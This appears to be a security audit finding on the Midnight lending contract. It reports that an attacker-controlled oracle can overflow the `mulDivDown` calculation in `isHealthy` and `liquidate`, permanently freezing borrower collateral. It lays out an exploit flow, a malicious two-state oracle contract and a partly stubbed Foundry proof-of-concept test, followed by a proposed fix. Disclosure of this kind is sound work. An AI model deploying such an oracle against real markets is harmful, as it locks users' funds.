### Title
Oracle Price Overflow Freezes Borrower Collateral via Unchecked `mulDivDown` in `isHealthy` / `liquidate` - (File: src/Midnight.sol)

### Summary
`touchMarket` is permissionless and performs no validation on the oracle address or its return value. `mulDivDown` in `UtilsLib` is not `unchecked`, so Solidity 0.8+ reverts on `collateral * price` overflow. A market creator who controls the oracle can return a price that overflows `uint256`, causing `isHealthy`, `withdrawCollateral`, `liquidate`, and `take` (for a seller with debt) to all revert, permanently freezing the borrower's collateral.

### Finding Description

**Root cause — no oracle return-value bound enforced on-chain.**

`mulDivDown` is:

```solidity
// src/libraries/UtilsLib.sol:29-31
function mulDivDown(uint256 x, uint256 y, uint256 d) internal pure returns (uint256) {
    return (x * y) / d;   // NOT unchecked — reverts on overflow in Solidity 0.8+
}
``` [1](#0-0) 

`isHealthy` calls it as:

```solidity
// src/Midnight.sol:953-955
uint256 price = IOracle(collateralParam.oracle).price();
maxDebt += _position.collateral[i].mulDivDown(price, ORACLE_PRICE_SCALE)
    .mulDivDown(collateralParam.lltv, WAD);
``` [2](#0-1) 

`liquidate` has the identical pattern: [3](#0-2) 

`touchMarket` validates `lltv`, `maxLif`, and token ordering — but **never validates the oracle address or its return value**: [4](#0-3) 

The Certora overflow proof (`NoMultiplicationOverflow.spec`) explicitly treats a bounded oracle price as an **assumption**, not a protocol-enforced invariant:

```
// Oracle integration assumption: every (collateralAmount * oraclePrice) fits in uint256.
function _.price() external => boundedPrice(calledContract) expect(uint256);
``` [5](#0-4) 

**Exploit flow:**

1. Attacker deploys `MaliciousOracle` whose `price()` initially returns a safe value (e.g., `ORACLE_PRICE_SCALE`).
2. Attacker calls `touchMarket(market)` with `collateralParams[0].oracle = address(MaliciousOracle)`. This succeeds — no oracle validation.
3. Victim borrower supplies `type(uint128).max` collateral and takes a loan (position is healthy at the safe price).
4. Attacker flips `MaliciousOracle.price()` to return `type(uint256).max / type(uint128).max + 1` (≈ `2^128 + 1`).
5. Now `collateral * price = type(uint128).max * (type(uint256).max / type(uint128).max + 1) > type(uint256).max` — overflow.
6. Every call that reaches `mulDivDown(collateral, price, ORACLE_PRICE_SCALE)` reverts:
   - `withdrawCollateral` → calls `isHealthy` → reverts. [6](#0-5) 
   - `liquidate` → computes `maxDebt` in the while-loop → reverts. [7](#0-6) 
   - `take` for a seller with debt → health check → reverts.

**Why existing checks fail:** `touchMarket` only validates `lltv` and `maxLif` tiers; the oracle field is stored verbatim. `IOracle` is a one-function interface with no return-value constraint. [8](#0-7) 

### Impact Explanation
The borrower's collateral is permanently locked: `withdrawCollateral` reverts (health check calls `isHealthy` which overflows), `liquidate` reverts (same overflow in its own `maxDebt` loop), and `take` for the seller with debt reverts. No recovery path exists without the oracle returning a non-overflowing price, which the attacker controls. This is a permanent fund freeze for the borrower's collateral.

### Likelihood Explanation
Market creation is fully permissionless — any address can call `touchMarket` with an arbitrary oracle. The attacker needs only to deploy a two-state oracle (safe price to attract borrowers, overflow price to freeze them) and create a market. The overflow threshold is `price > type(uint256).max / collateral`; with `collateral = type(uint128).max` the threshold is ≈ `2^128`, a trivially returnable `uint256`. The attack is repeatable across any market the attacker creates and is not detectable before the oracle flips.

### Recommendation
Add an on-chain price-bound check in `touchMarket` or at the point of oracle consumption. The simplest fix is to validate the oracle's current price at market creation time and/or enforce the product bound inside `isHealthy` and `liquidate`:

```solidity
// In isHealthy / liquidate, replace:
uint256 price = IOracle(collateralParam.oracle).price();
// with:
uint256 price = IOracle(collateralParam.oracle).price();
require(price == 0 || price <= type(uint256).max / type(uint128).max, OraclePriceOverflow());
```

Alternatively, use a `mulDivDown` variant that performs the multiplication in 512-bit space (as Solady's `FullMath`) and saturates rather than reverts, or add a `try/catch` wrapper around the oracle call and treat a revert as price = 0 (unhealthy).

### Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Midnight} from "src/Midnight.sol";
import {Market, CollateralParams} from "src/interfaces/IMidnight.sol";
import {ORACLE_PRICE_SCALE} from "src/libraries/ConstantsLib.sol";
import {maxLif} from "src/libraries/ConstantsLib.sol";

contract OverflowOracle {
    uint256 public price = ORACLE_PRICE_SCALE; // safe initially
    function setPrice(uint256 p) external { price = p; }
}

contract OracleOverflowFreezeTest is Test {
    Midnight midnight;
    OverflowOracle oracle;
    ERC20 loanToken;
    ERC20 collateralToken;
    address borrower = address(0xB0);

    function setUp() public { /* deploy midnight, tokens, oracle */ }

    function testOraclePriceOverflowFreezesFunds() public {
        // 1. Attacker creates market with malicious oracle (safe price)
        oracle.setPrice(ORACLE_PRICE_SCALE);
        Market memory market = _buildMarket();
        bytes32 id = midnight.touchMarket(market);

        // 2. Borrower supplies max collateral and borrows
        uint256 collateral = type(uint128).max;
        deal(address(collateralToken), address(this), collateral);
        midnight.supplyCollateral(market, 0, collateral, borrower);
        // ... take loan so borrower has debt > 0 ...

        // 3. Attacker flips oracle to overflow price
        uint256 overflowPrice = type(uint256).max / type(uint128).max + 1;
        oracle.setPrice(overflowPrice);

        // 4. Assert withdrawCollateral reverts
        vm.prank(borrower);
        vm.expectRevert(); // arithmetic overflow
        midnight.withdrawCollateral(market, 0, 1, borrower, borrower);

        // 5. Assert liquidate reverts
        vm.expectRevert(); // arithmetic overflow
        midnight.liquidate(market, 0, 0, 1, borrower, false, address(this), address(0), "");

        // 6. Assert isHealthy reverts
        vm.expectRevert();
        midnight.isHealthy(market, id, borrower);
    }
}
```

**Expected assertions:** all three calls revert with `Panic(0x11)` (arithmetic overflow), confirming permanent fund freeze.

### Citations

**File:** src/libraries/UtilsLib.sol (L28-31)
```text
    /// @dev Returns (x * y) / d rounded down.
    function mulDivDown(uint256 x, uint256 y, uint256 d) internal pure returns (uint256) {
        return (x * y) / d;
    }
```

**File:** src/Midnight.sol (L568-568)
```text
        require(isHealthy(market, id, onBehalf), UnhealthyBorrower());
```

**File:** src/Midnight.sol (L607-618)
```text
        while (_collateralBitmap != 0) {
            uint256 i = UtilsLib.msb(_collateralBitmap);
            CollateralParams memory _collateralParam = market.collateralParams[i];
            uint256 price = IOracle(_collateralParam.oracle).price();
            if (i == collateralIndex) liquidatedCollatPrice = price;
            uint256 _collateral = _position.collateral[i];
            maxDebt += _collateral.mulDivDown(price, ORACLE_PRICE_SCALE).mulDivDown(_collateralParam.lltv, WAD);
            badDebt = badDebt.zeroFloorSub(
                _collateral.mulDivUp(price, ORACLE_PRICE_SCALE).mulDivUp(WAD, _collateralParam.maxLif)
            );
            _collateralBitmap = _collateralBitmap.clearBit(i);
        }
```

**File:** src/Midnight.sol (L762-773)
```text
            for (uint256 i = 0; i < market.collateralParams.length; i++) {
                address collateralToken = market.collateralParams[i].token;
                require(collateralToken > previousCollateralToken, CollateralParamsNotSorted());
                uint256 lltv = market.collateralParams[i].lltv;
                require(isLltvAllowed(lltv), LltvNotAllowed());
                require(
                    market.collateralParams[i].maxLif == maxLif(lltv, LIQUIDATION_CURSOR_LOW)
                        || market.collateralParams[i].maxLif == maxLif(lltv, LIQUIDATION_CURSOR_HIGH),
                    InvalidMaxLif()
                );
                previousCollateralToken = collateralToken;
            }
```

**File:** src/Midnight.sol (L953-955)
```text
                uint256 price = IOracle(collateralParam.oracle).price();
                maxDebt += _position.collateral[i].mulDivDown(price, ORACLE_PRICE_SCALE)
                    .mulDivDown(collateralParam.lltv, WAD);
```

**File:** certora/specs/NoMultiplicationOverflow.spec (L12-49)
```text
    // Oracle integration assumption: every (collateralAmount * oraclePrice) fits in uint256.
    // Storage collateral is uint128, so boundedPrice enforces the product bound against max_uint128.
    function _.price() external => boundedPrice(calledContract) expect(uint256);

    // Deterministic toId: links call-site markets to validated state from touchMarket.
    function IdLib.toId(Midnight.Market memory market, uint256, address) internal returns (bytes32) => summaryToId(market);

    // Sound return bound: tickToPrice <= WAD for non-reverting calls.
    function TickLib.tickToPrice(uint256) internal returns (uint256) => boundedTickPrice();

    // Summarize mulDivDown and mulDivUp to track overflow.
    function UtilsLib.mulDivDown(uint256 x, uint256 y, uint256 d) internal returns (uint256) => mulDivDownSummary(x, y, d);
    function UtilsLib.mulDivUp(uint256 x, uint256 y, uint256 d) internal returns (uint256) => mulDivUpSummary(x, y, d);
}

/// HELPERS ///

persistent ghost bool mulOverflow;

definition WAD() returns uint256 = 10 ^ 18;

definition ORACLE_PRICE_SCALE() returns uint256 = 10 ^ 36;

// Proven in CreatedMarkets.spec (createdMarketsHaveLltvLessThanOrEqualToOne)
// and ExactMath.spec (maxLifIsAtLeastWad, maxLifIsAtMostTwoWad).
// Maturity is bounded to uint64 as a realistic timestamp assumption for overflow analysis.
function summaryToId(Midnight.Market market) returns (bytes32) {
    require forall uint256 i. i < market.collateralParams.length => market.collateralParams[i].lltv <= WAD(), "proven in CreatedMarkets.spec";
    require forall uint256 i. i < market.collateralParams.length => market.collateralParams[i].maxLif >= WAD() && market.collateralParams[i].maxLif <= 2 * WAD(), "proven in ExactMath.spec";
    require market.maturity <= max_uint64, "maturity fits in uint64: realistic timestamp assumption";
    return Utils.hashMarket(market);
}

// Bound every storage collateral (uint128) * oracle price product.
function boundedPrice(address oracle) returns uint256 {
    uint256 price;
    require to_mathint(price) * max_uint128 + ORACLE_PRICE_SCALE() - 1 <= max_uint256, "same as assuming that collateral * price <= uint256 with mulDivUp rounding headroom";
    return price;
```

**File:** src/interfaces/IOracle.sol (L1-7)
```text
// SPDX-License-Identifier: GPL-2.0-or-later
// Copyright (c) 2025 Morpho Association
pragma solidity >=0.5.0;

interface IOracle {
    function price() external view returns (uint256);
}
```
